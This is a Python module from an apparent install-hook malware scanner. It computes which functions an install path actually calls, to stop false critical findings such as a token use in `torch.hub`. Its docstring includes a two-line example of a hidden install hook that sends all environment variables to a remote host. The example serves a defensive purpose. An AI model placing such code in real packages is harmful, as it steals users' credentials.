"""Which function bodies an install hook actually causes to run.

`ImportClosure` answers which files run at install time, and answering it made
the context correct for the relocation bypass it was written against. It also
made the context correct for far too much: `setup.py` in a source distribution
ordinarily does `import mypackage` to read `__version__`, and from there the
closure reaches the whole library.

`pytorch/pytorch` is the case that forced this module. Its `setup.py` is a real
packaging script at the distribution root, so every guard on what counts as a
hook passes it, and `torch/hub.py` is reachable by import from it. Inside
`_validate_not_a_forked_repo` the module reads `GITHUB_TOKEN` from the
environment and sends it to `api.github.com` in an `Authorization` header --
which is what a GitHub token is for. That was `MALWARE.EXFIL.001`, CRITICAL,
in the MALICIOUS category, on one of the most installed Python libraries there
is, telling the reader to treat their host as compromised and rotate every
credential on it.

Importing `torch.hub` DEFINES that function. It does not call it. The claim the
rule makes -- "executes automatically on every install" -- is false for it, and
it is false for the great majority of a library's code.

## Why not "module level only"

The obvious rule is that only a module's top-level statements run on import, so
only those should carry the context. That is true, and using it would reopen the
exact bypass `ImportClosure` exists to close:

    # setup.py
    import _bootstrap; _bootstrap.init()

    # _bootstrap.py
    def init():
        urlopen("https://" + host, data=str(dict(os.environ)).encode())

Every capability there is inside a `def`, and the `def` is called. The
difference between that function and `torch.hub`'s is not where it is written;
it is whether anything on the install path calls it.

## What this does instead

A conservative call graph. The roots are the statements that run on import --
module level, and class bodies, which execute when the class is defined. From
there it follows calls by NAME to first-party function definitions and repeats
to a fixed point. What is left over -- a function nothing on that path calls --
is deferred, and its line range is reported to the caller.

Every approximation is made in the direction of keeping the finding, because
this decides the most serious claim the tool makes:

* A name is matched against every definition that bears it, in any file in the
  closure. Two unrelated `init` functions are both reachable if either is
  called.
* A decorated function is always reachable. A decorator can register it to be
  called from somewhere this analysis cannot see, which is how a plugin, a CLI
  and a task queue all work.
* A dunder is always reachable. `__init__` runs on construction and nothing
  calls it by name.
* A file that will not parse defers nothing, so all of it keeps the context.

So a function is called deferred only when it is written in ordinary Python,
has no decorator, is not a dunder, and no call to its name appears anywhere the
install path reaches.
"""

from __future__ import annotations

import ast
from typing import TYPE_CHECKING

if TYPE_CHECKING:
    from collections.abc import Iterable, Mapping

MAX_FUNCTIONS = 50_000
"""Ceiling on definitions indexed, for the same reason `ImportClosure` has one.

The graph is attacker-supplied. Beyond this the analysis stops and defers
nothing, which keeps the context rather than dropping it -- the safe direction,
and the reason the number has to be generous rather than cautious. Set to 5,000
first, which is the shape of mistake this ceiling invites: a 500-file slice of a
library the size of `torch` carries three times that, so the analysis would have
declined to run on exactly the repositories it was written for, and declined
silently. Measured at 15,000 definitions across 500 files it takes 0.6s, so the
cost was never what the low number implied.

`ImportClosure.MAX_FILES` already bounds the input to 500 files, so this bounds
only the pathological case of a file that is nothing but definitions."""


class CallReachability:
    """The function bodies an install hook never reaches."""

    @staticmethod
    def _functions(tree: ast.Module) -> list[ast.FunctionDef | ast.AsyncFunctionDef]:
        return [
            node
            for node in ast.walk(tree)
            if isinstance(node, ast.FunctionDef | ast.AsyncFunctionDef)
        ]

    @staticmethod
    def _called_names(nodes: Iterable[ast.AST]) -> set[str]:
        """Every name that appears as the callee of a call in these nodes.

        `f()` contributes `f` and `a.b.f()` contributes `f`: the attribute path
        is not resolved, because resolving it needs the import graph and getting
        it wrong drops a finding. The last segment alone over-approximates,
        which is the safe direction.
        """
        names: set[str] = set()
        for node in nodes:
            for inner in ast.walk(node):
                if not isinstance(inner, ast.Call):
                    continue
                func = inner.func
                if isinstance(func, ast.Name):
                    names.add(func.id)
                elif isinstance(func, ast.Attribute):
                    names.add(func.attr)
        return names

    @classmethod
    def _always_reachable(cls, node: ast.FunctionDef | ast.AsyncFunctionDef) -> bool:
        if node.decorator_list:
            return True
        return node.name.startswith("__") and node.name.endswith("__")

    @classmethod
    def _roots(cls, tree: ast.Module) -> list[ast.AST]:
        """The statements that run when this module is imported.

        Module level, plus class bodies: a `class` statement executes its body
        at definition time, so a call written there runs on import.
        """
        roots: list[ast.AST] = []
        for node in tree.body:
            if isinstance(node, ast.FunctionDef | ast.AsyncFunctionDef):
                continue
            roots.append(node)
        return roots

    @classmethod
    def deferred_lines(
        cls, hooks: Iterable[str], sources: Mapping[str, str]
    ) -> frozenset[tuple[str, int, int]]:
        """`(path, first_line, last_line)` for each body the hooks never reach.

        `hooks` is the install closure -- the hook files and everything they
        import. `sources` is the repository's Python by path.
        """
        trees: dict[str, ast.Module] = {}
        for path in hooks:
            source = sources.get(path)
            if source is None:
                continue
            try:
                trees[path] = ast.parse(source)
            except (SyntaxError, ValueError, RecursionError):
                # Unparseable: defer nothing, so every capability in it keeps
                # the context it has today.
                continue

        by_name: dict[str, list[tuple[str, ast.FunctionDef | ast.AsyncFunctionDef]]] = {}
        total = 0
        for path, tree in trees.items():
            for node in cls._functions(tree):
                by_name.setdefault(node.name, []).append((path, node))
                total += 1
        if total > MAX_FUNCTIONS:
            return frozenset()

        # Seed: everything that runs on import, plus the definitions this
        # analysis refuses to reason about at all.
        reachable: set[int] = set()
        frontier: list[ast.AST] = []
        for tree in trees.values():
            frontier.extend(cls._roots(tree))
        for definitions in by_name.values():
            for _path, node in definitions:
                if cls._always_reachable(node):
                    reachable.add(id(node))
                    frontier.extend(node.body)

        # Fixed point over called names.
        seen_names: set[str] = set()

        while frontier:
            names = cls._called_names(frontier) - seen_names
            seen_names |= names
            frontier = []
            for name in names:
                for _path, node in by_name.get(name, ()):
                    if id(node) in reachable:
                        continue
                    reachable.add(id(node))
                    frontier.extend(node.body)

        deferred: set[tuple[str, int, int]] = set()
        for path, tree in trees.items():
            for node in cls._functions(tree):
                if id(node) in reachable or not node.body:
                    continue
                first = node.body[0].lineno
                last = node.end_lineno or node.body[-1].lineno
                deferred.add((path, first, last))
        return frozenset(deferred)


__all__ = ["CallReachability"]
